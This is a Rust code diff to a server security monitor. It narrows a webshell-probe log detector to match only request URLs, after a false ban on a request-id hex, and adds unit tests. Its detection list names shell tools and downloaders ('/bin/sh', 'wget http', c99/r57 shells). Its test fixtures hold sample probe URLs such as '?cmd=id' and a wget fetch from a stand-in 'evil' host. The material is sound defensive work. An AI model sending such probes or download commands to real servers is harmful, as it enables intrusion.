@@ -18,6 +18,7 @@ use serde::{Deserialize, Serialize};
 pub use self::audits::ContainerPosture;
 
 use self::audits::{ConfigAssessmentMonitor, DockerPostureMonitor, PackageInventoryMonitor};
+use self::http_request::{extract_request, HttpRequest};
 use self::integrity::FileIntegrityMonitor;
 use self::ml::MlBehavioralDetector;
 use self::php_shell::{PhpShellAccessDetector, PhpShellOptions, PhpShellScanner, ScanRoot};
@@ -362,20 +363,17 @@ impl LogDetector for WebshellProbeDetector {
     }
 
     fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
-        let matches = matching_entries(
-            entries,
-            &[
-                "cmd=",
-                "exec=",
-                "shell=",
-                "powershell",
-                "/bin/sh",
-                "wget http",
-                "curl http",
-                "c99",
-                "r57",
-            ],
-        );
+        // The URL only. Matched anywhere in the line, `c99` hit the hex of
+        // request ids and bearer tokens in stacker's agent request logs, and
+        // this detector bans.
+        let matches: Vec<&LogEntry> = entries
+            .iter()
+            .filter(|entry| {
+                extract_request(&entry.line)
+                    .map(|request| probes_webshell(&request))
+                    .unwrap_or(false)
+            })
+            .collect();
 
         if matches.is_empty() {
             return Vec::new();
@@ -391,6 +389,25 @@ impl LogDetector for WebshellProbeDetector {
             sample_line: matches[0].line.clone(),
         }]
     }
+}
+
+/// A command parameter (`?cmd=id`), a shell or downloader in the URL, or a
+/// request for a known shell by name (`/c99.php`, `/r57shell.php`).
+fn probes_webshell(request: &HttpRequest) -> bool {
+    let command_parameter = request.query.split('&').any(|pair| {
+        let name = pair.split('=').next().unwrap_or_default();
+        pair.contains('=') && matches!(name, "cmd" | "exec" | "shell")
+    });
+    let target = format!("{}?{}", request.path, request.query).replace('+', " ");
+    let command_in_url = contains_any(
+        &target,
+        &["powershell", "/bin/sh", "wget http", "curl http"],
+    );
+    let known_shell = request
+        .path
+        .split('/')
+        .any(|segment| segment.starts_with("c99") || segment.starts_with("r57"));
+    command_parameter || command_in_url || known_shell
 }
 
 impl LogDetector for ExfiltrationHeuristicDetector {
@@ -937,5 +954,47 @@ mod tests {
         assert!(contains_github_token("github_pat_1234567890"));
         assert!(contains_aws_access_key("AKIAABCDEFGHIJKLMNOP"));
         assert!(!contains_aws_access_key("AKIAshort"));
+    }
+
+    fn webshell_probe_findings(line: &str) -> Vec<DetectorFinding> {
+        WebshellProbeDetector.detect(&[LogEntry {
+            source_id: "test".into(),
+            timestamp: chrono::Utc::now(),
+            line: line.into(),
+            metadata: HashMap::new(),
+        }])
+    }
+
+    #[test]
+    fn test_webshell_probe_ignores_stacker_agent_request_log() {
+        // The line from the false alarm: `c99` sits in the x-request-id hex.
+        let line = r#"2026-10-27T09:07:55.623595+00:00 dev stacker[2392813]: {"v":0,"name":"stacker","msg":"[AUTHENTICATE AGENT VIA X-AGENT-ID AND BEARER TOKEN - START]","level":30,"target":"stacker::middleware::authentication::method::f_agent","req":"\nServiceRequest HTTP/1.1 GET:/api/v1/agent/commands/wait/deployment_120254c6-598e-47a1-83ca-690840edd906\n  query: ?\"timeout=10\"\n  headers:\n    \"x-request-id\": \"6c26477f-51b2-4133-9c58-b1dac994f229\"\n    \"host\": \"dev.stacker.try.direct\"\n"}"#;
+        assert!(webshell_probe_findings(line).is_empty());
+    }
+
+    #[test]
+    fn test_webshell_probe_matches_the_url_only() {
+        for target in [
+            "/x.php?cmd=id",
+            "/x.php?a=1&exec=uname",
+            "/c99.php",
+            "/up/r57shell.php",
+            "/x.php?q=wget+http://evil/x",
+            "/cgi-bin/x?run=%2Fbin%2Fsh",
+        ] {
+            let line = format!(
+                r#"203.0.113.9 - - [31/Oct/2026:10:00:00 +0000] "GET {target} HTTP/1.1" 404 5 "-" "x""#
+            );
+            assert_eq!(webshell_probe_findings(&line).len(), 1, "{target}");
+        }
+
+        for line in [
+            // Indicators outside the URL: user agent, referrer, no request.
+            r#"198.51.100.7 - - [31/Oct/2026:10:00:00 +0000] "GET /index.php HTTP/1.1" 200 5 "https://x/?cmd=1" "curl http-client""#,
+            r#"Oct 31 10:00:00 host CRON[1]: (root) CMD (/bin/sh /etc/backup.sh)"#,
+            r#"198.51.100.7 - - [31/Oct/2026:10:00:00 +0000] "GET /assets/app.c99a1f.js?xcmd=1 HTTP/1.1" 200 5 "-" "x""#,
+        ] {
+            assert!(webshell_probe_findings(line).is_empty(), "{line}");
+        }
     }
 }
